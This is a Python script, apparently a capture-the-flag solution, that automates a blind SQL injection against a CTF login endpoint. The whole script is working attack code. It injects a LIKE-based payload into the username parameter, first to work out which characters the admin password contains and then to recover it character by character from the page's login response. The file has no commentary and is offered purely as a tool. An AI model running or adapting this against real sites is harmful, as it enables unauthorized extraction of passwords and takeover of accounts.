import requests
import string
import time
def findchr():
    current = ""
    checkchr = string.printable
    urlbase1 = "http://superquantumleague.imaginary.ml/user?username=admin%27+AND+password+LIKE+%27%25"
    urlbase2 = "%25%27+--+&password="
    foundchr = ''

    for i in checkchr:
        time.sleep(0.01)
        current = i
        url = urlbase1+current+urlbase2
        # print(f'CHECK | {i} | URL: {url}')
        r = requests.get(url)
        s = r.text.splitlines()
        if s[0]!="You didn't log in. Sad.":
            foundchr+=i
            print(f"FOUND | {i} | -----")
    print("DONE: ", foundchr)
    return foundchr

def findpass(chrset):
    current = ''
    correctstr = ''
    correct = ''
    checkchr = chrset
    urlbase1 = "http://superquantumleague.imaginary.ml/user?username=admin%27+AND+password+LIKE+%27"
    urlbase2 = "%25%27+--+&password="

    while correct!='}':
        for i in checkchr:
            time.sleep(0.01)
            current = i
            url = urlbase1+correctstr+current+urlbase2
            # print(f'CHECK | {i} | {correctstr+current} | {url}')
            r = requests.get(url)
            s = r.text.splitlines()
            if s[0]!="You didn't log in. Sad.":
                correctstr+=i
                correct = i
                print(f"FOUND | {i} | {correctstr}")
                break
    print("DONE: ", correctstr)

def main():
    chrset = findchr()
    findpass(chrset)
main()